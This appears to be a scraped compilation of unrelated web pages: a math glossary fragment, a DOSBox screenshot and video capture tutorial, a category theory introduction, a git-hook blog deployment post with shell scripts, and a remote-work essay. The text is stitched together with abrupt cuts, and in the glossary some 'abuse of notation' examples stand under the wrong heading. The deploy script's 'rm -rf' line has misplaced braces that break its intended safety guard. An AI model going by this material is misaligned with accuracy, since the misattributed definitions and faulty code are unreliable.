As a result, it is equipped with a system of specialized <strong><a aria-label="symbols (opens in a new tab)" href="https://mathvault.ca/hub/higher-math/math-symbols/" target="_blank" rel="noreferrer noopener">symbols</a></strong> and <strong>vocabularies</strong> — each with its own level of generality and formality.</p><p>Among these, there’s a particular subset of terms that is uniquely foundational and appropriate to our pursuit: the <strong>higher mathematical jargon</strong>. Loosely speaking, these are a set of specialized terms that fall into most — if not all — of the following categories:</p><ul><li>Specific to <strong>higher mathematics</strong></li><li><strong>English-looking</strong> (with a near-technical meaning)</li><li><strong>Frequently-occurring</strong></li><li><strong>Cross-disciplinary</strong> (i.e., not field-specific)</li></ul><p>In brief, these are terms that are generally accessible to most, yet still provide us with a glimpse of the world of non-miniaturized mathematics — and the way their practitioners act and think. In fact, in what follows, we’ve compiled a list of 106 such terms — along with some in-depth exploration of their <strong>definitions</strong>, <strong>examples</strong>, <strong>relevance</strong> and <strong>implications</strong>.</p><p>So if you’re ready to dive into this fascinating world that is known as mathematics, then let’s get started!</p><p>(and if you’re looking for a concise rendition of all the 106 terms featured in this glossary, then you might find the following <strong>higher math jargon mindmap</strong> both interesting and useful.)</p><span></span><figure><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Math-Glossary-Header-Image.png" alt="The Definitive Glossary of Higher Mathematical Jargons" width="1366" height="702" title="Math Glossary Header Image"></figure><h2 id="toc">Higher Mathematical Jargon — The Definitive List (106 Terms)</h2><p><span> The definitive glossary of higher mathematical jargon — from abstract nonsense, elementary proof to singularity and 101+ more. </span> <span><span>Click to Tweet</span><i></i></span></p><h2 id="abstraction"><a href="#toc">Abstraction</a></h2><p>The process of extracting the underlying <strong>structures</strong>, <strong>patterns</strong>, or <strong>properties</strong> of some mathematical objects, with the intention of generalizing these findings to a broader class of objects. These include, for example:</p><ul><li>Finding the <strong>shared properties</strong> of similar polynomials</li><li>Formalizing the <strong>general pattern</strong> of a sequence</li><li>Establishing a <a href="#otoc"><strong>one-to-one correspondence</strong></a> between two sets</li><li>Constructing an alternate <a href="#axiom"><strong>axiomatic system</strong></a> for Euclidean geometry</li></ul><p>At first, abstraction can seem a bit unappealing due to its higher cognitive demand and lack of connection to real-world phenomena. However, it can often turn out to be an integral force in bringing about a <strong>broaden applicability</strong> to a field — along with some <strong>unification</strong> in between the fields.</p><div><p>Did You Know?</p><p>While abstraction is involved in pretty much all subfields of mathematics, it is particularly well-represented in fields such as <strong>abstract algebra</strong>, <strong>model theory</strong>, <strong>axiomatic set theory</strong> and <a href="#nonsense"><strong>category theory</strong></a>.</p></div><h2 id="nonsense"><a href="#toc">Abstract Nonsense</a></h2><figure id="attachment_18333" aria-describedby="caption-attachment-18333"><img loading="lazy" src="https://mathvault.ca/wp-content/uploads/Category-Theory-Diagram.png" alt="Category Theory: A Category with Objects and Morphisms" width="325" height="325" title="Category Theory Diagram"><figcaption id="caption-attachment-18333">A category with objects $A$, $B$, $C$ and a series of morphisms.</figcaption></figure><p>A colloquial term for <strong><a href="https://en.wikipedia.org/wiki/Category_theory" target="_blank" rel="noopener noreferrer">category theory</a></strong> (a mathematical subject dedicated to the notion of category and the formalization of <a href="#structure">mathematical structures</a>), or the methods and arguments that are related to it.</p><p><span>Since different branches of mathematics deal with different mathematical structures satisfying the definition of a category, category theory can be regarded as a <strong>unifying theory</strong> of mathematics — whose results are applicable to a wide range of disciplines.</span></p><p>In particular, if a proposition follows from abstract nonsense, then it means that its argument has more to do with the underlying categorical structure of its objects — rather than the field where it’s found.

For example, one might say that:</p><ul><li>“$\mathbb{R}$ is distributive” — rather than “$(\mathbb{R}, +, \times)$ is distributive.”</li><li>“$3$ is differentiable” — rather than “the function defined by the rule $x \mapsto 3$ for all real $x$, is differentiable.”</li><li>“$a+b+c = c+b+a$” — rather than “$(a+b) + c = (c+b) + a$”.</li></ul><p>In the cases where the context and the assumptions are made clear and well understood, abuses of notation are usually harmless (if not actually desirable). In other cases, however, the same might not be true, and can amount to a <strong>misuse of notation</strong> — which is a faux-pas in mathematics (such as the case of $\frac{\mathrm{d}y}{\mathrm{d}x}=\frac{y}{x}$).</p><h2 id="algo"><a href="#toc">Algorithm</a></h2><p>A finite series of <a href="#welldefined">well-defined</a>, <strong>computer-implementable instructions</strong> to solve a specific set of computable problems.

<h2 id="vintage-dos-programs"><a href="#vintage-dos-programs">Vintage DOS Programs</a></h2>

<p>
Once in a while, I fire up one of the vintage DOS games or language
interpreters in DOSBox for nostalgia's sake. I have archived these
vintage programs at <a href="https://github.com/susam/dosage">github.com/susam/dosage</a>.
DOSBox is an emulator program that emulates IBM PC compatible computers
running DOS. Trying my hands on these antiquated DOS programs now evokes
old memories from my childhood days days when I first came across
computers as part of our primary school curriculum.
</p>

<p>
Computers were much simpler in those days. The ones in our school were
IBM PC compatible computers with mostly monochrome displays. A couple of
them had support for a very limited number of colours provided by CGA or
EGA graphics cards. The ability to boot a computer using a
5¼-inch floppy disk containing MS-DOS, load a Logo or BASIC
interpreter, or a computer game from another floppy disk, and then write
some programs or play a few games without any distraction had its own
charm that I find missing from modern day computing.
</p>

<p>
Often while using old DOS programs with DOSBox in this day and age, I
want to take screenshot captures or video captures of the DOSBox
sessions and share them with my friends. In this article, I will explain
how I create good quality screenshot captures and video captures of
DOSBox sessions in formats that I can share with others.

<h2 id="software-versions"><a href="#software-versions">Software Versions</a></h2>

<p>
Since this article involves several pieces of software, some of what is
written here may not hold good in future if the behaviour of any of
these software tools change in future. The list below contains the
versions of all software tools that were used to test the commands
provided in this article:
</p>

<ol>
  <li>macOS High Sierra 10.13.6</li>
  <li>DOSBox 0.74-3</li>
  <li>FFmpeg 4.3.1</li>
  <li>ImageMagick 7.0.10-28
  </li><li>IBM Personal Computer Logo Version 1.00</li>
  <li>Digger (Original PC booter version by Windmill Software)</li>
</ol>

<p>
Note that both Logo and Digger programs in the list above are DOS
programs that were released in 1983. They cannot be run directly on
modern computers but they can be run with DOSBox since it emulates old
IBM PC compatible computers.
</p>


<h2 id="ibm-pc-logo-in-dosbox"><a href="#ibm-pc-logo-in-dosbox">IBM PC Logo in DOSBox</a></h2>

<p>
IBM Personal Computer Logo developed by Logo Computer Systems Inc.
(LCSI) in 1983 was the first piece of software I got introduced to while
learning computers as a kid. I came across it at the age of 8 when I was
in Class 4 and our school had a 5¼-inch floppy disk with IBM PC
Logo on it. As a result, Logo was the first programming language I
learnt in my life. About 20 years later, I would realize that the first
programming language I learnt is a dialect of Lisp. How wonderful!
</p>

<p>
If the Logo interpreter program <code>LOGO.COM</code> exists in the
current directory, it can be run with DOSBox using the following
command:
</p>

<pre><code>dosbox LOGO.COM</code></pre>

<p>
One of the things I enjoyed drawing with Logo was a grid of overlapping
circles like this:
</p>

<figure id="logo-program-screenshot">
  <a href="https://susam.in/files/blog/dosbox-logo-1.png"><img src="https://susam.in/files/blog/dosbox-logo-1.png" alt="A grid made with 20 circles along with Logo source code for it"></a>
  <figcaption>

  </figcaption>
</figure>

<p>
Here is the Logo source code for the above output:
</p>

<pre><code>REPEAT 20 [REPEAT 180 [FD 1 RT 2] RT 18]</code>
</pre>


<h2 id="digger-in-dosbox"><a href="#digger-in-dosbox">Digger in DOSBox</a></h2>

<p>
At around the same time I learnt Logo, I also came across Digger, a
computer game for IBM PC developed by Windmill Software in 1983.
</p>

<figure id="digger-welcome-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-0.png"><img src="https://susam.in/files/blog/dosbox-digger-0.png" alt="A screenshot of Digger welcome screen with the names and pictures of various game characters with a copyright notice of Windmill Software"></a>
  <figcaption>
    Welcome screen of Digger
  </figcaption>
</figure>

<p>
If the Digger program <code>DIGGER.COM</code> exists in the directory,
it can be run using DOSBox with the following command:
</p>

<pre><code>dosbox DIGGER.COM -c "config -set cpu cycles=500" -machine cga</code>
</pre>

<p>
The <code>-machine cga</code> option emulates a machine with Color
Graphics Adapter (CGA) because Digger requires a machine of this type to
run correctly. The <code>cycles=500</code> configuration option slows
down the speed at which DOSBox emulates instructions in order to emulate
the slow machines of olden days. Without this option, Digger runs too
fast to be able to be conveniently playable.
</p>

<figure id="digger-game-screenshot">
  <a href="https://susam.in/files/blog/dosbox-digger-1.png"><img src="https://susam.in/files/blog/dosbox-digger-1.png" alt="A screenshot of underground maze in the game of Digger"></a>
  <figcaption>

  </figcaption>
</figure>

<p>
Digger has an excellent gameplay where the player digs through
underground tunnels to pick up emeralds, drop gold bags to release the
gold or squash nobbins and hobbins, collect the released gold to earn
more points, and so on. It uses bright and attractive colours. The music
is great. When Digger was released in 1983, it was quite advanced for
its time.
</p>



<h2 id="dosbox-screenshot-capture"><a href="#dosbox-screenshot-capture">DOSBox Screenshot Capture</a></h2>

<p>
The screenshots above were obtained by running IBM PC Logo and the
original 1983 PC booter version of Digger on DOSBox and then resizing
the screenshots such that their aspect ratio matches the aspect ratio of
old CRT computer monitors.
</p>

<p>
To obtain the screenshots, we first press <kbd>Ctrl</kbd> +
<kbd>F5</kbd> while DOSBox is running. The paths of the screenshots
appear in the console output at the terminal where DOSBox was launched.
For example:
</p>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/logo_001.png</samp>
</pre>

<pre><samp>Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_000.png
Capturing Screenshot to /Users/susam/Library/Preferences/capture/digger_001.png</samp>
</pre>

<p>
The screenshots obtained in this manner have an aspect ratio of 8:5
which makes the output look stretched horizontally. The old CRT computer
monitors for which these old DOS programs were written had an aspect
ratio of 4:3 instead. This stretched look can be fixed by resizing the
images to an aspect ratio of 4:3. Here are the commands used to fix the
aspect ratio and produce the images:
</p>

<pre><code>convert logo_000.png -sample '1920x1440!' dosbox-logo-0.png
convert logo_001.png -sample '1920x1440!' dosbox-logo-1.png</code>
</pre>
<pre><code>convert digger_000.png -sample '1920x1440!' dosbox-digger-0.png
convert digger_001.png -sample '1920x1440!' dosbox-digger-1.png</code>
</pre>

-->

<p>
The <code>convert</code> program comes with ImageMagick. There are a few
things worth noting here:
</p>

<ul>
  <li>
    We use the <code>-sample</code> option here to resize the image as
    opposed to using <code>-resize</code> or <code>-scale</code>. The
    <code>-resize</code> or <code>-scale</code> option would smooth the
    jagged edges in the text and graphics by introducing additional
    colours. The <code>-resize</code> option is great for real world
    images where we do want the edges to be smooth while scaling up or
    down but in these screenshots we want to retain the crisp and jagged
    edges that is typical of DOSBox and the old CRT monitors. Therefore
    we use the <code>-sample</code> option that does not introduce any
    new colours. Instead it uses nearest-neighbour interpolation (point
    sampling) to decide the colours of the scaled image.
  </li>
  <li>
    The <code>!</code> flag is used to ignore the aspect ratio of the
    original image. Without this flag, the output files would be
    1920x1200 in size, that is, the largest size with an aspect ratio of
    8:5 that fits in a 1920x1440 box. With this flag, the original
    aspect ratio of 8:5 is ignored and the output is exactly 1920x1440
    in size.

<h2 id="dosbox-video-capture"><a href="#dosbox-video-capture">DOSBox Video Capture</a></h2>

<p>
To start capturing video of DOSBox, we press <kbd>Ctrl</kbd> +
<kbd>Alt</kbd> + <kbd>F5</kbd>. The same key combination stops capturing
video. The following output appears in the console output to show where
the video file is saved:
</p>

<pre><samp>Capturing Video to /Users/susam/Library/Preferences/capture/logo_000.avi
Stopped capturing video.</samp>
</pre>

<p>
Say, I want to share a video capture of DOSBox with Logo running on it
with my friends who might be on devices that do not support playing AVI
files. The following FFmpeg command converts the video to a format that
can be distributed widely and played on a wide range of devices and
players:
</p>

<pre><code>ffmpeg -i logo_000.avi -an -c:v libx264 -preset veryslow \
       -crf 17 -vf format=yuv420p,scale=1920:1440:flags=neighbor,fps=30 \
       dosbox-logo.mp4</code>
</pre>

<p>
Here is what the output looks like:
</p>

<figure id="logo-video">
  <video controls="">
    <source src="https://susam.in/files/blog/dosbox-logo.mp4" type="video/mp4">

  <figcaption>
    Video capture of IBM Personal Computer Logo
    [<a href="https://susam.in/files/blog/dosbox-logo.mp4">MP4</a>]
  </figcaption>
</figure>

<p>
Let us briefly discuss the various FFmpeg options used here:
</p>

<ul>
  <li>
    <p>
      <code>-i logo_000.avi</code>
    </p>
    <p>
      This, of course, specifies the input file.
    </p>
  </li>
  <li>
    <p>
      <code>-an</code>
    </p>
    <p>
      The audio is silent in this video, so we reduce the file size a
      little by disabling the audio stream with this option. For
      example, without this option the output file size was 317 KB but
      with this option it turned out to be 282 KB.
    </p>
    <p>
      This option should not be specified if the audio stream needs to
      preserved, for example, with DOS games that have audio. We will
      see an example of this in the next section.
    </p>
  </li>
  <li>
    <p>
      <code>-c:v libx264</code>
    </p>
    <p>
      This option selects the x264 encoder to encode the video stream
      into H.264 format. H.264 is also known as MPEG-4 Part 10, Advanced
      Video Coding (MPEG-4 AVC). Currently, it is the most popular
      format for recording, compression, and distribution of video
      content.
    </p>
  </li>
  <li>
    <p>
      <code>-crf 17</code>
    </p>
    <p>
      This option provides visually lossless output, that is, high
      quality output without any loss in quality that can be perceived
      by human eyes. For completely lossless output, we need to use the
      <code>-crf 0</code> option. However, this option sets the video
      profile to <code>High 4:4:4 Predictive</code> which prevents the
      video from playing in some video players. This issue is discussed
      in more detail in the point about <code>yuv420p</code> pixel
      format that comes later in this list. Since <code>-crf 0</code>
      cannot be used due to this issue, the next best option is
      <code>-crf 1</code> which while not completely lossless is much
      better than …</p></li></ul></div></div>

</section><p>Early in our mathematical education, we learn about a strong interplay between algebra and geometry—algebraic equations give rise to graphs and geometric figures, and geometric features can be encoded in algebraic expressions. It’s almost as if there’s a portal or bridge connecting these two realms in the grand landscape of mathematics: whatever occurs on one side of the bridge is mirrored on the other.<span id="more-12565"></span></p>

<p>So although algebra and geometry are very different areas of mathematics, this connection suggests that they are intrinsically related. Incidentally, the `bridge’ that spans them is a but a dim foreshadow of much deeper connections that exist between other branches of mathematics that also may, a priori, seem unrelated: set theory, group theory, linear algebra, topology, graph theory, differential geometry, and more. And what’s amazing is that these relationships—these bridges—are more than just a neat observation. They are <em>mathematics</em>, and that mathematics has a name: <em>category theory</em>.</p>
<h2>What is a category?</h2>
<p>Martin Kuppe once created a wonderful map of the mathematical landscape (see facing page) in which category theory hovers high above the ground, providing a sweeping vista of the terrain. It enables us to see relationships between various fields that are otherwise imperceptible at ground level, attesting that seemingly unrelated areas of mathematics aren’t so different after all. This becomes extraordinarily useful when you want to solve a problem in one realm (topology, say) but don’t have the right tools at your disposal. By ferrying the problem to a different realm (such as group theory), you’re able to see the problem in a different light and perhaps discover new tools that may help the solution become much easier. In fact, this is precisely how category theory came to be. It was birthed in the 1940s in an attempt to answer a difficult topological question by recasting it in an easier, algebraic light.</p>
<p>Thinking back to the mathematical landscape, you’ll notice that each realm consists of some objects (set theory has sets, group theory has groups, topology has topological spaces…) that relate to each other (sets relate via functions, groups relate via homomorphisms, topological spaces relate via continuous functions…) in sensible ways (such as composition and associativity).</p>

<p>This common thread weaves throughout the landscape and unites the various fields. The mathematics of category theory formalises this unification. More concretely, a <em>category</em> is a collection of <em>objects</em> with relationships between them (called <em>morphisms</em>) that behave nicely in terms of <em>composition</em> and <em>associativity</em>. This provides a template for mathematics, and depending on what you feed into that template, you’ll recover one of the mathematical realms: the category of sets consists of sets and relationships (ie functions) between them; the category of groups consists of groups and relationships (ie group homomorphisms) between them; the category of topological spaces consists of topological spaces and relationships (ie continuous functions) between them; and so on.</p>
<p><a href="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg"><img loading="lazy" src="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=654%2C113" alt="" width="654" height="113" srcset="https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=1024%2C177 1024w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=300%2C52 300w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=768%2C132 768w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?resize=6%2C1 6w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?w=1308 1308w, https://i0.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/objects.jpg?w=1962 1962w" sizes="(max-width: 654px) 100vw, 654px" data-recalc-dims="1"></a></p>
<p>The analogy between a category and a template is due to Barry Mazur from his wonderfully written, non-technical introduction to category theory, <a href="http://www.math.harvard.edu/~mazur/preprints/when_is_one.pdf" target="_blank" rel="noopener"><em>When is one thing equal to some other thing?</em></a> In it he writes, “This concept of category is an omni-purpose affair… There is hardly any species of mathematical object that doesn’t fit into this convenient, and often enlightening, template.” Indeed, as category theorist <a href="http://chalkdustmagazine.com/interviews/in-conversation-with-eugenia-cheng/" target="_blank" rel="noopener">Eugenia Cheng</a> so aptly put it in her treatise <a href="http://cheng.staff.shef.ac.uk/misc/4000.pdf" target="_blank" rel="noopener"><em>Higher-dimensional category theory</em></a>, “category theory is the mathematics of mathematics”.</p>
<h2>It’s all about relationships</h2>
<p><a href="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg"><img loading="lazy" src="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=498%2C401" alt="" width="498" height="401" srcset="https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=1024%2C826 1024w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=300%2C242 300w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=768%2C619 768w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?resize=1%2C1 1w, https://i2.wp.com/chalkdustmagazine.com/wp-content/uploads/2018/10/list.jpg?w=1048 1048w" sizes="(max-width: 498px) 100vw, 498px" data-recalc-dims="1"></a>One of the main features of category theory is that it strips away a lot of detail: it’s not really concerned with the individual elements in your set, or whether or not your group is solvable, or if your topological space has a countable basis. So you might be thinking, “Eh, category theory sounds so abstract. Can any good come from this?” Happily, the answer is yes! An advantage of ignoring details is that our attention is diverted away from the individual objects and turned towards the relationships—the morphisms—that exist between them. And as any category theorist will tell you, <em>relationships are everything.</em></p>
<p>Indeed, one of the main maxims of category theory is that <em>a mathematical object is completely determined by its relationships to all other objects</em>. To put it another way, two objects are essentially indistinguishable if and only if they relate to every object in the category in the same way. This theme (which is a consequence of a famous result called the Yoneda lemma) isn’t too different from what we observe in life. You can learn a lot about people by looking at their relationships—their Facebook friends, who they follow on Twitter, who they hang out with on Friday nights, for instance. And if you ever meet two people who have the <em>exact same</em> set of friends, and whose interactions on social media are <em>exactly the same</em>, and who hang out with the <em>exact same</em> people on Friday nights, then you might jokingly say, “You can’t even tell them apart”. Category theory informs us that, all jokes aside, this is actually true mathematically!</p>

So you might wonder “Hmm, if mathematical relationships are <em>that</em>&nbsp;important, then what about relationships between categories? Do <em>they</em>&nbsp;exist?” Great question. The answer is: absolutely! In fact, these particular relationships have a name—they are called <em>functors</em>. But why stop there? What about the relationships between those relationships? They, too, have a name: <em>natural transformations.</em></p>
<p>In fact, we can keep on going: “What about the relationships between the relationships between the relationships between the…?” Doing so will land us in higher-dimensional category theory, which is where much of Cheng’s research lies.</p>
<p>As abstract as this may sound, these constructions—categories, functors, and natural transformations—comprise a treasure trove of theory that shows up almost everywhere, in mathematics <em>and</em> in other disciplines! Since its inception, category theory has found natural applications in computer science, quantum physics, systems biology, chemistry, dynamical systems, and natural language processing, just to name a few. (The <a href="http://appliedcategorytheory.org/workshops">website</a> `Applied category theory’ contains a list of applications.) So even though category theory might sound a little abstract, it is highly applicable. And that’s no surprise. Category theory is all about relationships, and so is the world around us!</p>
<h2>Conclusion</h2>
<p>Categories are a little bit like anchovies: some folks love ’em, while for other folks they’re an acquired taste. So yes, it’s true that category theory may not help you find a delta for your epsilon, or determine if your group of order 520 is simple, or construct a solution to your PDE. For those endeavours, we do have to put our feet back on the ground. But thinking categorically can help serve as a beacon—it can strengthen your intuition and sharpen your insight—as you trek through the nooks and crannies of your favourite mathematical realms. And these days it’s especially hard to escape the pervasiveness of category theory throughout modern mathematics. So whatever your mathematical goals may be, learning a bit about categories will be well worth your time!</p>

<p>(alternate title: Rationalizing writing pointless shell scripts)</p>
<p>You should create your own blog and start writing. At lest that's what people who write blogs say. Apparently there is something good about creating things of something. So let's give it a try.</p>
<p>However in order to start a blog one must first have a some kind of a blogging platform. The sane way to do this would be to use your search engine of choice and research the available solutions in order to find one that sounds the most appealing.</p>
<p>Unfortunately before I could do that I had two very bad thoughts that stuck in my mind:</p>
<ol>
<li><em>If it's about the joy of creation, why not also create the blogging platform?</em></li>
<li><em>Wait, wouldn't it be cool if my publishing command was <code>git push</code> and then Git hooks took care of the rest?</em></li>
</ol>
<p>The result, surprisingly, is somewhat usable.</p>
<h2 id="requirements">Requirements</h2>
<p>As a good little software engineer I began by listing some requirements upfront before I even started to write code:</p>
<ol>
<li>Ability to work offline.</li>
<li>Publishing via <code>git push</code> + some server hooks.</li>
<li>Being able to deploy locally for previews.</li>
<li>Generating static pages.</li>
<li>Being able to write in Markdown or directly in HTML.</li>
<li>Generating an Atom/RSS feed automatically.</li>
</ol>
<p>Doesn't sound too bad, right? So let's see what came out of it.</p>
<h2 id="the-result">The Result</h2>
<p>In the end I got the whole thing running with three short(-ish) scripts, lets look at the first one:</p>
<p><strong>deploy.sh:</strong></p>
<pre><code>#!/bin/sh

BASE=$(pwd)
TARGET=${TARGET:-~/target}
HEADER=$BASE/header.html
FOOTER=$BASE/footer.html

rm -rf "{$TARGET:?}"/*
find * -type d ! -path '\.\/\.*' -print | xargs -I DIR  sh -c "mkdir -p $TARGET/DIR; HEADER=$HEADER FOOTER=$FOOTER ./indexer.sh DIR $TARGET/DIR"

find . -type f -name '*md' -print | sed 's/md$//' | xargs -I NAME  sh -c " { cat $HEADER; pandoc $BASE/NAMEmd; cat $FOOTER; } &gt; $TARGET/NAMEhtml; echo $TARGET/NAMEhtml"

find . -type f ! -path '\.\/\.*' ! -name '*md' -print | grep -v -E "footer.html|header.html|index-header.html|$0|indexer.sh|feed-header.xml" | xargs -I NAME cp "$BASE/NAME" "$TARGET/NAME"</code></pre>
<p>Initially I imagined it would look a bit prettier but oh well. Essentially it's an uglier way to say:</p>
<ol start="0">
<li>Remove whatever was last deployed. (Pray that it would not <code>rm -rf /</code>)</li>
<li>Index every directory.</li>
<li>Parse every Markdown into HTML and insert it between the header and footer.</li>
<li>Copy any other arbitrary files which are not used in the previous steps.</li>
</ol>
<p>Lovingly step number 3 uses a hard-coded list. I'm sure that won't bite me in the future.</p>
<p>However there is one fun thing about indexing. If we remove the first <code>find</code> line from most "important" features of a blog will still function - you would still be able to write and publish. The indexing is "only" for generating the update feed and creating a little landing page where visitors of the blog could see all articles in a list, sorted with the most recent first - that detail is important. So let's talk about indexing now.</p>
<h2 id="indexing---the-8020-rule">Indexing - the 80/20 rule</h2>
<p>The <code>./indexer.sh</code> script mention in the last code block looks like this:</p>
<pre><code>#!/bin/sh

HOME="https://rilia.xyz/"
HTML_OUT=$2/index.html
ATOM_OUT=$2/feed.atom

feed_entry() {
  echo "
    &lt;entry&gt;
      &lt;title&gt;$3&lt;/title&gt;
      &lt;link href=\"${HOME}${1}.html\"/&gt;
      &lt;id&gt;${HOME}${1}.html&lt;/id&gt;
      &lt;updated&gt;$2&lt;/updated&gt;
      &lt;content type=\"xhtml\"&gt;
$(pandoc $4)
      &lt;/content&gt;
    &lt;/entry&gt;"
}

html_entry() {
  echo "&lt;p&gt;&lt;a href=\"/$1.html\"&gt;$3&lt;/a&gt;&lt;i&gt; - $(echo $2 | sed 's/\ .*$//')&lt;/i&gt;&lt;/p&gt;&lt;br /&gt;"
}

cat "$HEADER" "$1"/index-header.html &gt; "$HTML_OUT"
echo '&lt;div class=feed&gt; &lt;a href=feed.atom&gt;Atom Feed&lt;/a&gt;&lt;/div&gt;' &gt;&gt; "$HTML_OUT"

cat "$1"/feed-header.xml &gt; "$ATOM_OUT"
date --rfc-3339=seconds &gt;&gt; "$ATOM_OUT"
echo '&lt;/updated&gt;' &gt;&gt; "$ATOM_OUT"

for f in "$1"/*md
do
  git log --format="%at" --reverse "$f" | head -n 1 | xargs -I {} echo "{} $f"

done | sort -rn |  while read pair
do
  date=$(echo $pair | sed 's/\ .*$//')
  f=$(echo $pair | sed 's/^.*\ //')
  timestamp=$(date --date=@"$date" --rfc-3339=seconds)
  title=$(grep -m 1 -e '^#\ ' "$f" | sed 's/^#\ \ *//')
  location=$(echo "$f" | sed 's/\.md$//' | sed 's/^\.\///')

  feed_entry "$location" "$timestamp" "$title" "$f" &gt;&gt; "$ATOM_OUT"
  html_entry "$location" "$timestamp" "$title" &gt;&gt; "$HTML_OUT"
done

cat "$FOOTER" &gt;&gt; "$HTML_OUT"
echo '&lt;/feed&gt;' &gt;&gt; "$ATOM_OUT"

echo "$HTML_OUT"
echo "$ATOM_OUT"
</code></pre>
<p>Whelp... Can't really sugar coat that one, it's ugly. Fun side note, you might have heard bout the <a href="https://en.wikipedia.org/wiki/Pareto_principle">80/20 rule</a>. One way to interpret it is that around 80% of the effort contributes to 20% of the final result. It doesn't really say that but bear with me: the two scripts are in total roughly 63 lines of code, from which <code>indexer.sh</code> is 51. That means that the indexing code is roughly 81% of the code base and probably of the total effort as well. Why was indexing difficult? Well it turns out that under Linux you cannot easily see the creating date of a file. You can do it under *BSD or Windows but the Linux kernel does not export some property of ext4 or something<a href="#fn1" id="fnref1"><sup>1</sup></a>. I <em>could</em> migrate the server to *BSD or try to get a better version of the <code>stat</code> core utility. Luckily since I was already using git repo to hold the blog files I had a workaround<a href="#fn2" id="fnref2"><sup>2</sup></a>, let's take a closer look at the following lines:</p>
<pre><code>for f in "$1"/*md
do
  git log --format="%at" --reverse "$f" | head -n 1 | xargs -I {} echo "{} $f"

done | sort -rn |  while read pair</code></pre>
<p>From the <code>git-log</code> manual it says that <code>%at</code> will display the "author date, UNIX timestamp". Therefore we can sort files based by querying when each one was added to the git repository. Probably very inefficient but it gets the job done and it works without any side effects. An alternative might be to use hooks that fire off on commits and appends the filename of the new files to a list. It would probably provide a good optimization for the total time it takes to update everything. The thing that worries me about that is that you would need to keep the list synchronised locally and with the server and also to try not to lose it. Perhaps the file could be part of the git repo? Possible optimizations for the future. At my current scale (one blog post) it doesn't really matter.</p>
<h2 id="the-git-hook">The Git Hook</h2>
<p>That one turned out easier than I expected, not much to say about it:</p>
<p><strong>post-update:</strong></p>
<pre><code>#!/bin/sh

unset GIT_INDEX_FILE

rm -rf /tmp/deploy
mkdir -p /tmp/deploy
GIT_DIR='/var/git/rilia.git'
git --work-tree=/tmp/deploy checkout -f
(cd /tmp/deploy; TARGET='/var/www/rilia' ./deploy.sh)</code></pre>
<h2 id="benefits-of-doing-it-this-way">Benefits of doing it this way</h2>
<p>I'm not sure but there might be some merit to using Git for a blogging platform:</p>
<ul>
<li>Relatively few dependencies</li>
</ul>
<p>Of course ignoring the big one - git, but I already wanted to have a private git server anyway so it was easily justifiable. Also for Markdown I use <code>pandoc</code>, but you could try some simpler tool or even a different templating language, <code>htlatex</code> is a thing.</p>
<ul>
<li>No active server</li>
</ul>
<p>At some point I checked <a href="https://gohugo.io/">hugo</a> since I overheard it was a good choice for making static sites. However configuration files scare me as well as having another server process active all the time. The git repo solution runs only on updates.</p>
<p>There is also <a href="https://mkws.sh/">mkws</a> which looks like a cool project, but I learned about it after being mostly done with the scripts.</p>
<h2 id="conclusion">Conclusion</h2>
<p>I dunno, make stuff or something. Generating HTML is not <em>that</em> difficult so if the idea of making your own platform sounds appealing just go for it. Writing the scripts was somewhat fun even if I'm not a big fan of the POSIX shell syntax. In the end you might find a novel way to do a relatively simple thing and on its own that could be fun.</p>

	<p>I kinda hate myself for writing this post like a revelation in the times of pandemic and talking about remote work while it is <em>hot topic</em> . In reality, I have been working 100% remotely for more than 2 years (I previously worked for more than 8 years in the offices) and right now I feel I can tell my experiences about remote work and why I will probably never go back to a regular office job.</p>
<p>Around 2 years ago I got the offer to join MailerLite as a remote contractor. I was over-thinking whether I should start working remotely, what would it mean for me, my habits, social life, and my career progress. There were too many unknowns at that point as I have only done some freelance gigs remotely, but have been involved with distributed teams all over the world in previous companies. I took the red pill and my remote journey began.</p>
<p>All my doubts were cleared right away.</p>
<p>The first one - traffic. I hate the traffic in Belgrade. The city isn’t building its infrastructure (roads, bridges) as fast as it is growing and it is showing. On a good day, it took around 30 minutes of driving to work, which is not a problem. But, in the majority of days going to work and back home took on average 2 hours. I say 2 hours because you have to take into account that you have to find a parking space, probably 10 minutes from the office, and then walk to the office which all adds to 2 hours of lost time each day. If you calculate - it means that you are losing <strong>22 days per year</strong> in the traffic.</p>
<p>What could you do with that extra <em>time</em> that you have? I remember one analogy when I talked to one of my friends as he said: “It is like when people are telling that smokers could put all money they spend on cigarettes aside and can buy a new car after some time of saving. Then you see people who stopped smoking and after some time you don’t see them with a new car”. That wasn’t the case for me. I rediscovered hobbies that I have stopped practicing because of lack of time - started playing guitar more, recording new music, and most importantly, I had time to read more non-business related books. You can become dull and get into a work-home-sleep routine because of the lack of time.</p>
<p>Micromanagement was the other thing that I thought could happen in remote work. Fortunately, it didn’t. It is just a matter if you trust your employees or not. If you don’t trust your employees, you either didn’t hire the right people for your company or you are suffering from trust issues and adapting to the situation. Usually, it is the second thing. People who slack off because there aren’t any measures of control because they are working remotely show their faces and bad habits really fast and you can easily filter them.</p>
<p>When working remotely, <strong>you are your own manager</strong>. You must plan your time and goals, and how much you give yourself to work. Not too little and not too much, balance, as always, is the key.</p>
